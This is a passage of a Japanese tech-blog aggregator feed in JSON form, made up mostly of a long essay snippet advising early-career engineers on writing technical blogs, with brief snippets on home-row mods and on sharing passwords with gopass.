modsは、ホームポジションのasdf（左）とjkl;（右）を押しっぱなしたときに（hold）、CtrlやShiftなどの修飾キーとして機能させる方法論です。","isoDate":"2025-03-31T00:00:00.000Z","dateMiliSeconds":1743379200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"3年目までに身につけたい技術ブログの書き方","link":"https://syu-m-5151.hatenablog.com/entry/2025/03/31/034420","contentSnippet":"はじめにあなたは日々、何かを見ている。そう、コードを。エラーを。ドキュメントを。解決策を。そして、それは誰も見ていないものかもしれない。あるいは、多くの人が同じものを見ているのに、誰も記録に残していないのかもしれない。「自分なんてまだ1年目、2年目。経験が浅いから書くことなんてない」そんな思いを抱いていませんか？ しかし、その思い込みは真実ではありません。むしろ、経験の浅さこそが、あなたにしか書けない貴重な視点を生み出します。初めて学ぶ時の困惑、理解するまでの試行錯誤、そして「あ、わかった！」という喜び—これらの生々しい体験は、あなたがまさに今感じているからこそ書ける宝物なのです。「専門家でもないのにブログなんて書けない」「自分の書いたものなんて誰も読まないだろう」という思いも、単なる幻想です。誰もが最初から専門家ではなかった。今あなたが参考にしている記事を書いた人も、最初は不安を抱えながらキーボードに向かったはずです。このブログを書いている私もです。ネット上には膨大な情報があふれていますが、だからこそ、あなたの視点、あなたの言葉、あなたの経験を通して伝えられる情報には価値があります。なぜなら、あなたの記事を必要としている人は、まさにあなたと同じ疑問や課題を持っている人だからです。技術ブログは、完璧な知識や完成された思考を示すためのものではありません。それは思考の過程を記録するものです。完璧を目指すあまり書けなくなるよりも、不完全でも自分の観察と気づきを残していくことに価値があります。自分が躓いたその瞬間こそ、同じ場所で立ち止まっている誰かにとっての地図になる。あなたが苦労して辿り着いた解決策は、未来の誰かの貴重な時間を節約するだけでなく、新たな発見への扉を開くきっかけになるかもしれません。この記事では、技術ブログの種類とその書き方、特に新人エンジニアが取り組みやすいパターンについて解説します。ブログを書く意義、どのようなブログを書けばよいのか、どう書き始めればよいのか、批判されたときにはどうすればよいのかを知ることで、あなたの歩んできた道は他のエンジニアにとって価値ある情報源となり、同時にあなた自身の成長を加速させる強力なツールとなるでしょう。「でも、文章を書くのが苦手で…」「何を書けばいいか分からなくて…」と思っているあなたも、この記事を読み終わる頃には、最初の記事を書くためのアイデアとやる気を手に入れているはずです。さあ、あなたの知識や経験を世界と共有する旅を、一緒に始めましょう。このブログが良ければ読者になったり、nwiizoをフォロワーしてくれると嬉しいです。では、早速はじめていきます。はじめにブログ執筆がもたらす価値思考を整理する鏡知識の共有経済への参加思考の足跡としてのブログ技術ブログの主な種類とその書き方1. 学習ログ＆チュートリアル体験記2. バグハント記事3. 環境構築ガイド4. 学んだ教訓記事5. プログラミング言語の乗り換え記録6. システム開発の舞台裏7. 技術トレンドの考察8. 技術の性能比較と検証書き始めるための実践ガイド始めやすいブログパターンの選択日常からネタを発掘する技術読者を惹きつける記事構成読みやすさを高める実践テクニック心地よい技術コミュニケーションのために読み手の感情を大切にする好きなものを中心に語る個人の経験として共有する主観的な表現を心がけるポジティブな内容を中心に批判を柔らかく伝える工夫背景情報を丁寧に説明するもし反発を受けたときの心構え人気記事には批判も付きもの反応せずに見守る勇気を持つコメントの背景を想像してみる誤解には丁寧な補足を時間の流れを味方にするブログ公開の場の選択技術特化型プラットフォーム汎用ブログプラットフォーム自前のブログプラットフォーム選びのアドバイス継続のための現実的なアプローチ小さなハードルから始める自分のための記録として書く「十分に良い」の基準を持つ終わりに本気(マジ)の話ブログ執筆がもたらす価値技術ブログを書く行為には、表面的には見えない多くの価値があります。思考を整理する鏡「説明できることは理解している証拠だ」という言葉があります。コードを書くだけではわからなかった理解の穴が、他者に説明しようとする瞬間に見えてきます。ブログ執筆は自分の思考をクリアにし、知識の定着を促す強力なツールです。ラバーダック・デバッギングがコードの理解を深めるように、ブログはあなたの思考を整理します。知識の共有経済への参加オープンソースのコードを共有するように、あなたの解決策や洞察も共有価値があります。あなたが30分かけて解決した問題は、記事を通じて何百人もの時間を節約するかもしれません。それは単なる善意ではなく、テクノロジー業界の発展に寄与する行為です。思考の足跡としてのブログ定期的に書かれたブログは、あなたの専門性と成長の記録となります。それは履歴書やポートフォリオ以上に、あなたの思考プロセスと問題解決能力を示す生きた証拠になります。自然と「個人ブランド」が形成され、思わぬ機会につながることもあるでしょう。技術ブログの主な種類とその書き方1. 学習ログ＆チュートリアル体験記新人に特におすすめ新しい技術やツールを学んだ過程を記録するブログです。チュートリアルの穴を埋めたり、つまずいたポイントの解決策を共有したりします。書き方のポイント:学習の目的と背景を明確につまずいたポイントと解決法を詳細に公式ドキュメントには書かれていない気づきを強調スクリーンショットやコードスニペットで手順を明確に構成例:学習の動機（なぜこの技術を学ぼうと思ったか）前提知識と環境学習プロセス（つまずいたポイントを含む）得られた気づきと学び次のステップ2. バグハント記事特定のバグや問題を発見し、追跡し、最終的に修正するまでの旅を共有するブログです。書き方のポイント:問題の症状と影響を具体的に調査プロセスを時系列で詳細に（ミステリー小説のように、叙述トリックを使ってもよいですがほどほどに⋯）フレームグラフ、ログ、診断データなどの「証拠」を提示どのような思考プロセスで原因に辿り着いたかを解説最終的な解決策と学んだ教訓構成例:問題の概要（何が起きたか）調査の開始（最初の仮説）探索と証拠収集誤った道と行き止まり（失敗も正直に）原因の特定と理解解決策と検証学んだ教訓と予防策3. 環境構築ガイド開発環境や特定のツールのセットアップ方法を解説するブログです。書き方のポイント:対象読者（初心者か上級者か）を明確に前提条件と必要なツールを明示手順をステップバイステップで説明トラブルシューティングの情報を含める何のためにこの設定をするのかの理由も説明構成例:目的と概要前提条件と必要なものインストール手順（ステップバイステップ）設定と最適化動作確認の方法よくあるトラブルとその解決法4. 学んだ教訓記事プロジェクトや技術的課題から得た教訓や気づきを共有するブログです。書き方のポイント:率直かつ謙虚なトーンで具体的な状況と文脈を提供失敗や間違った判断からの学びを強調他のエンジニアに適用できる一般的な教訓を抽出時系列に沿った「日記的」な構成も有効構成例:状況と背景直面した課題取った行動と判断結果と振り返り学んだ教訓次回への活かし方5. プログラミング言語の乗り換え記録既存のプロジェクトを新しいプログラミング言語やフレームワークで作り直した経験を共有するブログです。書き方のポイント:言語やフレームワークを変更した理由を分かりやすく説明古い言語と新しい言語の違いと比較移行作業で苦労した点とその解決方法処理速度や保守のしやすさの比較結果言語の乗り換えから学んだこと構成例:現状と移行の動機技術選定と比較検討移行戦略と計画実装の詳細と課題成果と比較（ビフォー・アフター）学んだ教訓と今後の展望6. システム開発の舞台裏システムや機能をどのように考え、設計し、作り上げたかを詳しく説明するブログです。書き方のポイント:システムの目的と必要な機能を明確に設計で迷った点や判断した理由を説明全体の構造を図や図解でわかりやすく重要なコードの部分とその役割の解説ぶつかった壁とその乗り越え方今後の改善点や拡張できる部分構成例:プロジェクトの背景と目標要件と制約条件設計の選択肢と検討プロセス選んだアーキテクチャとその理由実装の重要ポイント課題と解決策結果と評価7. 技術トレンドの考察IT業界の流行りや新しい技術の動きについて、自分なりの意見や分析を述べるブログです。書き方のポイント:堅固な論拠と証拠で意見を裏付ける単なる批判ではなく、建設的な視点を提供自分の経験に基づいた具体例を含める複数の視点を考慮し、バランスの取れた議論を展開明確な結論と、読者が検討すべきポイントを提示構成例:トレンドの概要と背景現在の状況分析メリットとデメリット実務への影響と適用性自分の見解と予測実践的なアドバイス8. 技術の性能比較と検証異なる技術や方法の速度や効率を実際に測って比較し、その結果を共有するブログです。書き方のポイント:テスト方法と環境を詳細に記述公平で再現可能なベンチマーク手法を使用データを明確に視覚化（グラフ・表）結果の解釈と実用的な意味を説明限界と注意点も正直に伝える読者が検証できるようコードや手順を共有構成例:テストの目的と背景検証環境とセットアップテスト方法と条件結果の提示と分析発見と考察実用的な示唆と推奨事項書き始めるための実践ガイド始めやすいブログパターンの選択新人エンジニアが最初に挑戦しやすいのは、自分の直接体験に基づいた記事です。特に以下のパターンは、書きやすく読者にも価値を提供しやすい傾向があります。学習ログ＆チュートリアル体験記 - 公式ドキュメントには書かれていない「実際にやってみたらどうだったか」の記録は、後続の学習者にとって貴重な情報源になります。また、英語のチュートリアルを日本語でやってみるだけでも大きな価値があります。環境構築ガイド - 一度苦労して設定した開発環境の手順は、記録しておくだけで大きな価値があります。読者や半年後の自分も、同じ苦労をせずに済むでしょう。バグハント記録 - 解決に時間がかかった問題は、その過程を含めて記録する価値があります。デバッグの思考プロセスこそが、技術的な洞察を含んでいます。学びの教訓 - 「〜だと思っていたけど、実際は違った」という気づきは、技術記事として非常に価値があります。誤解やミスコンセプションを正す内容は、多くの人の時間を節約します。日常からネタを発掘する技術記事のアイデアは日々の業務や学習の中に隠れています。以下の視点で日常を観察してみましょう。学習過程での「なぜ？」、理解するのに時間がかかった概念や、直感に反する仕様は、記事になりやすいトピックです。繰り返し説明していること、チーム内で何度も同じ説明をしている内容は、記事化する価値が高いでしょう。検索しても満足な答えが見つからなかった問題、そのような問題を解決できたなら、あなたと同じ検索をする誰かのために記録を残しましょう。「あれ？」と思った瞬間、予想通りに動かなかったコード、意外な挙動を示したツール、これらの「あれ？」の瞬間は、貴重な記事の種です。このような日常の発見からブログネタを見つける考え方は、ジェームス・W・ヤングの名著『アイデアのつくり方』に私の考え方は近いです。ヤングによれば、アイデアとは既存の要素の新しい組み合わせであり、その才能は事物の関連性を見つけ出す力に依存しています。ヤングが提唱する5段階のアイデア創出プロセスは、技術ブログ執筆にも応用できます。資料を収集する - 特定のテーマに関する専門知識と、幅広い一般知識の両方を集める資料を噛み砕く - 集めた情報を様々な角度から検討し、関係性を探る問題を放棄する - 一度意識的な思考から離れ、無意識に働かせるアイデアが訪れる - 何気ない日常の瞬間（シャワー中やトイレなど）に閃きが生まれるアイデアを現実に連れ出す - 閃いたアイデアを忍耐強く形にするあなたの「あれ？」という瞬間は、ヤングの創造プロセスの一部として考えることができます。まず資料収集の段階で日々の開発や、読書、学習から知識を蓄え（第1段階）、それらの情報を頭の中で検討し関連付けようとし（第2段階）、一度問題から離れて無意識に働かせ（第3段階）、そして「あれ？」という気づきや閃きが訪れるのです（第4段階）。この瞬間を逃さず記録し、丁寧に育てて記事として形にしていく作業が最終段階（第5段階）となります。日々の疑問や発見を意識的に記録する習慣をつけることで、ヤングのプロセスを体現し、貴重なブログの種を蓄積できるでしょう。「ブログが書けない」と悩んでいるほとんどの人は、この5段階のプロセスのどこかが欠如していることがほとんどです。そして、どの段階が欠如しているかによって、対応方法が大きく変わります。資料収集が不足している人には、まずは情報のインプットを増やすことが重要です。技術書を読む、オンラインコースを受講する、技術カンファレンスの動画を見るなど、様々な方法で知識の幅を広げましょう。また、特定の技術だけでなく、隣接分野や全く異なる分野の知識も取り入れることで、独自の組み合わせが生まれやすくなります。情報の噛み砕きが不足している人には、学んだことをノートにまとめる、同僚に説明する、図解してみるなどの方法がおすすめです。具体化したり抽象化したりするのもおすすめです。情報を受動的に受け取るだけでなく、自分の言葉で咀嚼し直すことで、新たな気づきが生まれやすくなります。リラックスの時間が不足している人には、意識的に「何も考えない時間」を作ることが大切です。常に問題解決モードでは、無意識の働きが活かせません。散歩する、お風呂に浸かる、瞑想するなど、頭を空っぽにできる時間を日常に取り入れましょう。閃きを見逃している人には、スマートフォンのメモアプリやノートを常に持ち歩き、思いついたことをすぐに記録する習慣をつけることをおすすめします。閃きは突然訪れ、すぐに消えてしまうものです。「あとで覚えておこう」と思っても、ほとんどの場合は忘れてしまいます。書ききれない人には、「まずは15分だけ書く」という小さなハードルから始めることをおすすめします。完璧な記事を目指すのではなく、とにかく書き始めること。編集や推敲は後からでも可能ですが、書かれていない文章は編集のしようがありません。また、締め切りを設定したり、書き始める時間と場所を決めておくなど、環境を整えることも効果的です。あなたがブログを書けない理由がどの段階にあるのかを特定することで、より効果的な対策を講じることができるでしょう。アイデアのつくり方作者:ジェームス W.ヤングCCCメディアハウスAmazon読者を惹きつける記事構成技術ブログも、読者が最後まで読みたくなる構成が重要です。以下のような流れを意識すると、読みやすい記事になります。問題提起 - なぜこの記事を書いたのか、読者にとってどんな価値があるのかを明確にします。最初の段落で「この記事を読むことで解決できる問題」を具体的に示すことで、読者の興味を引きつけましょう。「〜に悩んでいませんか？」「〜をもっと効率的にしたいと思いませんか？」といった形で読者の課題に共感を示すと効果的です。ただし、単なるクリックベイト的な見出しや過度な約束は避け、記事の内容と一致した誠実な問題提起を心がけましょう。コンテキスト - あなたの環境や前提条件を説明し、読者が自分の状況と比較できるようにします。「私がこの問題に取り組んだ時の状況はこうでした」と具体的に共有することで、読者は自分のケースとの類似点や相違点を理解できます。使用した技術のバージョン、ハードウェア環境、チームの規模、プロジェクトの背景など、関連する情報を提供しましょう。これにより、読者は記事の内容が自分にとって適用可能かどうかを判断できます。コンテキストが明確であればあるほど、読者は安心して読み進められます。探求の旅 - 単なる解決策ではなく、そこに至るまでの思考プロセスを共有することで、読者は深い理解を得られます。最初に考えたアプローチ、試した方法、直面した課題、そしてなぜ最終的な解決策にたどり着いたのかを時系列で説明しましょう。失敗したアプローチも含めて正直に共有することで、記事の信頼性が高まり、読者も同じ失敗を避けられます。「最初はAという方法を試みましたが、Bという問題に直面したため、Cというアプローチに切り替えました」といった形で、あなたの試行錯誤のストーリーを語ることで、記事に人間味と深みが加わります。発見と学び - 技術的な発見だけでなく、アプローチ方法についての洞察も含めましょう。「この経験から学んだ最も重要なことは〜です」と明確に示すことで、読者は記事の本質的な価値を理解できます。コードやシステムの改善点だけでなく、問題解決プロセス、チーム協力、技術選定の基準など、より広い文脈での学びを共有すると、記事の応用範囲が広がります。特に、「意外だったのは〜」「常識と違ったのは〜」といった予想外の発見は強調する価値があります。こうした「目から鱗」の瞬間は、読者にとって最も記憶に残る部分となるでしょう。次のステップ - 読者が更に探求できるように、参考資料や発展的な内容へのリンクを提供します。「もっと詳しく知りたい方はこちらの資料がおすすめです」「次のステップとして〜を検討するとよいでしょう」といった形で、読者の学習旅行の次の目的地を示唆しましょう。また、未解決の課題や将来の展望についても正直に触れることで、読者との対話を促すことができます。「現在はまだ〜という課題が残っていますが、今後は〜のアプローチを試してみる予定です」といった形で、完璧な解決策だけでなく、進行中の探究であることを示すと、より現実的で共感を得られる記事になります。読みやすさを高める実践テクニック技術的な内容を伝える際、読みやすさは極めて重要です。以下のテクニックを活用して、読者が最後まで読み進められる記事を目指しましょう。最初の3行で読者を掴む - 記事の冒頭3行は、読者が「続きを読むか」を決める重要な部分です。問題提起や具体的な価値を示し、興味を引く導入を心がけましょう。「この記事を読むと〜ができるようになります」「あなたも経験したことがあるかもしれませんが、〜という問題は実は〜で解決できます」といった書き出しが効果的です。ただし、注意点として、技術ブログでは大言壮語や過度な主張（「これが唯一の正しい方法だ」「これさえ知れば全てが解決する」など）は避けるべきです。断定的な表現は炎上リスクを高め、読者の信頼を損なう恐れがあります。「私の経験では」「この特定の状況では」といった限定的な表現を使い、バランスを保ちましょう。見出しを上手に使う - 大見出しと小見出しで内容を整理し、ざっと見ただけでも内容がつかめる構造にします。見出しは「目次」としての役割を持ち、読者が求める情報に素早くアクセスするための道標となります。見出しには具体的な内容や得られるメリットを含めると、さらに効果的です。例えば「実装方法」よりも「3ステップで実装できるシンプルな方法」の方が読者の興味を引きます。また、見出しの階層構造は3段階程度に抑え、整理された印象を与えましょう。長い文章は小分けに - 長い文章が続くと読者は疲れます。適度に区切って、読者が「ここまで読めた」と小さな達成感を得られるようにします。段落は1つの考えにつき1つにし、3〜5行程度を目安にするとよいでしょう。また、読みやすさを高めるために、箇条書きや番号付きリストを活用して情報を整理しましょう。さらに、重要なポイントには太字や斜体などの強調を適切に使い、視覚的なメリハリをつけることで、スキャンしやすくなります。ただし、強調の使いすぎは逆効果なので、本当に重要な部分だけに留めるのがコツです。コードと説明文のバランス - 長すぎるプログラムコードは避け、重要な部分だけを取り出して、それに説明を加えましょう。コードブロックの前には「何をするコードなのか」、後には「なぜそのように実装したのか」「どのような効果があるのか」を説明すると理解が深まります。また、複雑なコードは徐々に構築していく形で示すと良いでしょう。初めに基本形を示し、段階的に機能を追加していくアプローチは、特に初心者にとって理解しやすい方法です。コメントを適切に挿入することも効果的ですが、コード自体が説明的であることを心がけましょう。具体例と全体像を交互に - 具体的なコード例と、そこから学べる一般的な教訓を交互に示すことで、理解が深まります。「木を見て森も見る」アプローチで、読者は個別の実装詳細と、それがどのように大きな概念に適合するかを同時に理解できます。例えば、特定のパターンの実装例を示した後、「このパターンが特に有効なのは〜のような状況です」と一般化すると、読者は自分の状況への応用がしやすくなります。逆に、原則や概念を先に説明してから具体例で補強する方法も効果的です。両方のアプローチを記事内で使い分けると、多様な学習スタイルの読者に対応できます。視覚的要素を活用する - 複雑な概念や関係性は、文章だけでなく図やダイアグラム、スクリーンショットで説明すると理解が格段に向上します。特に、システムアーキテクチャやデータフロー、アルゴリズムの流れなどは視覚化が効果的です。図は装飾ではなく情報を伝える手段として使い、適切なキャプションを付けることで文脈を明確にしましょう。また、長い記事では適度に図を挿入することで、読者に視覚的な休息も提供できます。図の作成には専門的なツールは必ずしも必要なく、シンプルな図であれば手書きスケッチをスキャンしたものでも十分に価値があります。読者の知識レベルを想定する - 対象とする読者層の知識レベルを想定し、それに合わせた説明の詳しさを調整しましょう。初心者向けの記事では基本概念から丁寧に説明し、上級者向けには深い技術的洞察や最適化のポイントに焦点を当てます。どちらの場合も、前提知識を記事の冒頭で明確にしておくと、読者は自分に適した内容かどうかを判断できます。「この記事はXYZの基本を理解している方を対象としています」といった一文を入れるだけでも効果的です。また、専門用語を使う場合は、初出時に簡単な説明を加えるか、リンクで参照先を示すと親切です。余韻を残す結びで読者の思考を広げる - 優れた技術ブログは、単に情報を伝えるだけでなく、読後に読者の思考を広げるものです。結びのパートでは、説明した技術の将来性や発展の可能性、異なる文脈での応用例などに軽く触れておくと、読者は記事を閉じた後も考え続けるきっかけとなります。「この技術は〜の領域でも応用できるかもしれません」「今回紹介した手法をさらに発展させると、どのような可能性が開けるでしょうか」といった問いかけは、読者の創造性を刺激し、自分なりの解釈や発展を考える余韻をもたらします。また、「私自身はこの技術と出会って、〜という視点が変わりました」のような個人的な洞察や、技術の社会的意義に触れることで、読者に新たな気づきや内省の機会を提供できます。心地よい技術コミュニケーションのために技術ブログを書くとき、単に知識を共有するだけでなく、読み手がどう感じるかに気を配ることも大切です。思慮深いコミュニケーションは、あなたのメッセージをより効果的に伝え、建設的な対話を生み出します。以下の考え方を意識することで、知識共有の質を高め、不要な論争を避けることができるでしょう。読み手の感情を大切にする書いた内容が誰かを傷つけていないか考えてみましょう。「この書き方だと、誰かが自分を批判されていると感じるかも」と想像することが大切です。例えば、ある技術について「この方法は時代遅れだ」と書くより、「私の用途ではこの新しい方法がうまく機能しました」と表現する方が、読み手の心を開いたままにします。技術選択は多くの場合、状況やニーズに依存するものであり、一概に優劣をつけられないことを認識しましょう。好きなものを中心に語るあなたが好きな技術や方法について熱く語りましょう。何かを批判するよりも、自分が価値を見出しているものについて語る方が、読者との良い関係を築けます。「Aは問題だらけだがBは素晴らしい」ではなく、「Bのここが素晴らしい」と伝えるだけで十分です。英語圏でよく使われる「not for me」（これは私には合わない）という表現は、技術ブログでも有効です。これは「悪い」というわけではなく、単に「私の状況や好みには合わない」という意味を含んでいるからです。個人の経験として共有する「すべてのエンジニアは〜すべきだ」「この業界では〜が常識だ」といった広い主語での断言は避けましょう。代わりに「私の経験では」「私のチームでは」と限定して話すことで、意見の押し付けにならず、経験の共有として受け取ってもらえます。それでも強引に批判してくる人はいます。そういう人はそもそもめちゃくちゃに批判したくてその構成が目の前に存在しているからめちゃくちゃに言ってくるのですが、日本語をちゃんと読めない人を相手にする必要はありません。あなたの経験を共有する権利は誰にも奪われないのです。主観的な表現を心がける「これは正しい方法だ」「あれは間違っている」という価値判断ではなく、「私はこの方法が好きです」「私の場合はこちらの方法が合っていました」という表現にすることで、異なる意見の人も受け入れやすくなります。私たちはみな異なる状況で働いており、一つの正解があるわけではないことを認識しましょう。特に技術の世界では、同じ問題に対しても多様なアプローチが存在することを尊重することが重要です。ポジティブな内容を中心に問題点や不満よりも、解決策や学びを中心に書きましょう。ネガティブな内容は同様にネガティブな反応を呼びがちです。「〜が使いにくい」より「こうすると〜がもっと使いやすくなりました」という表現の方が、建設的な対話につながります。あなたが困難を乗り越えた経験は、その過程で学んだことと共に共有することで、より価値のある情報になります。批判を柔らかく伝える工夫どうしても批判的な内容を書く必要があるときは、批判の対象をぼかしたり、自分の失敗談を交えたりすることで、攻撃的に見えるのを避けられます。「私も以前は〜と思っていましたが、実際にやってみると〜だとわかりました」といった表現なら、相手の反感を買いにくくなります。また、批判する際も建設的な代替案を提示することで、単なる不満ではなく有益なフィードバックとして受け取られやすくなります。背景情報を丁寧に説明する「これはこういう状況での話です」「私はこういう前提で考えています」と背景を明確にすることで、誤解を防げます。普通に人と喋っている時は省略するかもしれない文脈の紹介も技術ブログを書く時には必要です。誤読する余地を可能な限り減らします。特に技術的な主張をするときは、あなたの環境や条件を明示することで、「それは特定の状況下での話だね」と理解してもらいやすくなります。使用しているハードウェア、ソフトウェアのバージョン、チームの規模、プロジェクトの性質など、具体的な情報を提供することで、読者はあなたの経験を適切に文脈化できます。もし反発を受けたときの心構えどれだけ配慮して書いても、時には予想外の反応を受けることがあります。インターネット上での議論は時に感情的になりがちです。正直なところ、批判されたときの最初の感情は「なんでこんなこと言われなきゃいけないんだ」という怒りや落胆でしょう。そんな感情は自然なものですし、一時的に落ち込んだり、イラっとしたりするのも当然です。でも、そんなときに役立つ考え方をいくつか紹介します。人気記事には批判も付きもの多くの人に読まれるブログには、様々な価値観を持つ人が訪れます。あなたの意図とは関係なく、一定数の批判的なコメントが寄せられるのは自然なことです。人気の証と考えて、あまり気にしすぎないようにしましょう。実際、最も影響力のある技術記事でさえ、必ず反対意見や批判があります。これは多様な視点が存在することの健全な証でもあります。反応せずに見守る勇気を持つ批判的なコメントを見ると、すぐに反論したくなるものです。正直に言えば、「このバカ！ちゃんと記事を読め！」と思うこともあるでしょう。そんな感情を持つのは自然なことです。しかし、インターネット上での議論は感情的になりやすく、さらなる誤解を生むことも。多くの場合、反応しないことが最も賢明な選択です。キーボードから離れて深呼吸し、「本当に返信する価値があるか」を冷静に考えてみましょう。時間が経てば自然と収まることが多いものです。たまには筆を折って、「今日はもうネットを見ない日」を作るのも立派な対処法です。コメントの背景を想像してみる批判的なコメントを残す人の他の発言を見てみると、多くの場合、その人自身の傾向が見えてきます。常に批判的なコメントを残している人もいれば、特定のトピックに強い感情を持っている人もいます。「これはその人の反応パターンなのだ」と理解すれば、個人的な攻撃と受け取らずに済みます。時には「この人、今日はどうしたんだろう？仕事で嫌なことでもあったのかな？」と想像してみるのも手です。多くの批判的コメントは、あなたの記事そのものよりも、コメントした人のその日の気分や状況から生まれていることもあるのです。批判的なコメントをパブリックな場に書く人のほとんどは想像力が欠如しているのでその言葉で他人が傷つくということをほとんど何も考えていないです。実際に会うと優しかったりもします。でも、親切にスルーすることが、時には最大の優しさかもしれません。誤解には丁寧な補足を明らかな誤解に基づいた批判が多い場合は、記事に追記や修正を加えるのが効果的です。「追記：いくつかコメントをいただき、この点が誤解を招いているようなので補足します」といった形で、丁寧に説明すると良いでしょう。個別のコメントに反論するよりも、記事自体を改善する方が建設的です。これは読者全体にとっても価値があり、あなた自身の成長にもつながります。時間の流れを味方にするインターネット上の話題は移り変わりが早いものです。今日の論争も、明日には忘れられていることがほとんどです。一時的な批判に過度に反応するよりも、次の記事作成に前向きに取り組む方が、長期的には実りある選択となるでしょう。実際に「nwiizoさんの記事は役に立ちました」と声をかけられることはあっても、「お前の記事はクソだぞ」と直接言ってくる人は珍しいものです(私もそれぐらい強烈な論を発したいものです)。批判は匿名の場で、称賛は直接あなたに届くという不思議な法則があります。そして、真っ当な批判からは学び、感情的な批判は「私はそれだけの反応を引き出せるだけの影響力を持っているんだ」と前向きに捉える余裕を持ちましょう。ブログ公開の場の選択ブログを書く場所の選択は、思っているより重要な決断です。それぞれの場には一長一短があり、あなたの目的によって最適な選択肢は異なります。技術特化型プラットフォーム技術者向けのプラットフォームは、すでに技術に興味のある読者が集まっているという利点があります。初めから技術的な話題を求めている読者にリーチしやすく、専門的な議論が生まれやすい環境です。一方で、プラットフォームのルールやコミュニティの雰囲気に合わせる必要があり、自由度はやや制限されます。また、特定の技術コミュニティでは賛否両論が起きやすいトピックもあります。汎用ブログプラットフォームより幅広い読者層にアクセスできる汎用プラットフォームは、技術と非技術の境界領域の話題に適しています。テクニカルな内容を非エンジニアに伝えたい場合や、キャリアや働き方など、技術に付随する話題を扱いたい場合に向いています。ただし、深く技術的な内容は響く読者が少なく、反応が薄くなる可能性もあります。自前のブログ自分のドメインで運用するブログは、完全な自由度とブランディングの利点があります。長期的に見れば最も資産価値が高く、あなたのキャリアと共に育てていけるものになります。しかし、読者を集めるための工夫や継続的なメンテナンスが必要で、特に始めたばかりの頃は「誰も読んでいない」という状況に直面することも。SEO対策やSNSでの拡散など、追加の努力が求められます。プラットフォーム選びのアドバイス最初は低いハードルで始められる技術特化型プラットフォームでスタートし、書く習慣が身についてきたら自前のブログも並行して運用するというアプローチが現実的です。どのプラットフォームを選ぶにしても、コンテンツの所有権やエクスポート機能について確認しておくことをお勧めします。いつか別の場所に移行したいと思ったとき、あなたの資産を持ち出せるかどうかは重要な要素です。継続のための現実的なアプローチ技術ブログを一度書くことは難しくない。難しいのは書き続けることだ。以下は実践的な継続のコツだ。小さなハードルから始めるブログ執筆を習慣化するには、負荷を最小限に抑えることが重要です。月1回、あるいは四半期に1回といった現実的な頻度設定から始めましょう。15分でも執筆時間を確保できれば、少しずつ文章は成長していきます。無理な目標設定はモチベーションを消耗させるだけです。自分のための記録として書く「誰も読まないかもしれない」という恐れは、「自分のための記録」という視点で克服できます。将来の自分が参照するための記録として書けば、読者がゼロでも価値があります。実際、多くの技術ブログは、書き手自身が後日参照することで最大の価値を発揮します。「十分に良い」の基準を持つ完璧主義はブログ執筆の最大の敵です。「もっと調査が必要」「もっと洗練された文章にしたい」という思いは尽きませんが、公開されない記事に価値はありません。80%の完成度で公開する勇気を持ちましょう。改善はいつでもできます。このブログも80％ぐらいの完成度で公開してます(本当に)。終わりに技術の世界では、私たちは常に何かの「初心者」であり続けます。むしろ「初心者」であるべきです。新しい言語、新しいフレームワーク、新しいパラダイム—学びに終わりはありません。ベテランエンジニアでさえ、新技術の前では「初心者」に戻るのです。だからこそ、どの経験レベルの視点も価値があります。思い出してみてください。あなたが最初にプログラミングを学んだ時の興奮を。新しいフレームワークに触れた時の発見の喜びを。バグを解決した時の達成感を。これらはすべて、記録する価値のある体験です。そして、どの瞬間においても、あなたの「今」の視点は誰かにとって貴重な道標になります。完璧なブログではなく、あなたの観察と経験を率直に記録したブログこそが、同じ道を歩む誰かの力になるのです。いま書き始めることで、あなたは単なる技術の消費者から、コミュニティに貢献する創造者へと変わることができます。ブログは、知識の完成形を示すものではなく、思考の過程を記録するものです。あなたの躓きと発見の記録が、誰かの旅路を照らす灯になるでしょう。そして、その灯は時間が経っても消えることなく、未来の誰かを導き続けます。書くことで得られるのは、他者への貢献だけではありません。自分自身の思考を整理し、知識を定着させ、キャリアを形作っていく力にもなります。数年後、あなたが書いた記事の蓄積を振り返った時、そこには自分の成長の軌跡が鮮明に記録されているでしょう。継続のコツは「完璧を目指さない」ことです。まずは短く、1回15分でも書ける小さなテーマから始めましょう。また、定期的に書く習慣をつけるために、特定の曜日や時間帯を決めておくと効果的です。そして何より、自分自身が「書いていて楽しい」と感じられるトピックを選ぶことが長続きの秘訣です。技術ブログの世界では、読者からのフィードバックが得られることも大きな魅力です。あなたの記事に寄せられたコメントや質問から、新たな気づきを得ることもあるでしょう。それは、一人では辿り着けなかった視点や解決策との出会いかもしれません。今日から始めてみませんか？ 最初は小さな記事でいいのです。今週解決した問題について、新しく学んだツールの使い方、チームでの取り組みから得た気づき、読んだ技術書の要点と感想、あなたのチームが採用している開発プロセス、先輩から学んだテクニックなど、あなたの日常には書くべき価値のあるトピックがきっと溢れています。あなたの最初の記事は、誰かの最初の一歩を助ける光となるかもしれません。そして、書き続けることで、あなた自身も技術の世界でより深く、より遠くまで進んでいけるでしょう。書き始めることに価値があります。あなただけの観察眼で捉えた技術の風景を、今日から記録してみませんか。その一歩が、あなたのキャリアと技術コミュニティの未来を、より豊かなものにするはずです。「誰かのために書く」のではなく、「自分のために書き始め、結果として誰かの役に立つ」—これが、技術ブログの本当の姿だと思っています。さあ、あなたの最初の記事を、今週ぐらいに書いてみませんか？プリンシプル オブ プログラミング 3年目までに身につけたい 一生役立つ101の原理原則作者:上田勲秀和システムAmazon本気(マジ)の話これは本気で言っているのですが今回は流石にめちゃくちゃに良いブログだと思うので欲しいものリストを公開します。www.amazon.jp","isoDate":"2025-03-30T18:44:20.000Z","dateMiliSeconds":1743360260000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"gopass を使ってパスワード共有を試す","link":"https://blog.1q77.com/2025/03/share-password-using-gopass/","contentSnippet":"gopass とはPostgres Weekly を眺めていて Creating Postgres Roles with Passwords Stored in Gopass という記事で gopass というものの存在を知りました。名前から分かるように Go 言語で書かれており、マルチプラットフォームのパスワード管理用コマンドラインツールです。GPG を使って暗号化し、Git で管理します。GPG の公開鍵暗号を使って複数人で複合することが可能になっており、任意の人とパスワードを共有することが可能です。","isoDate":"2025-03-29T00:57:32.000Z","dateMiliSeconds":1743209852000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Fish 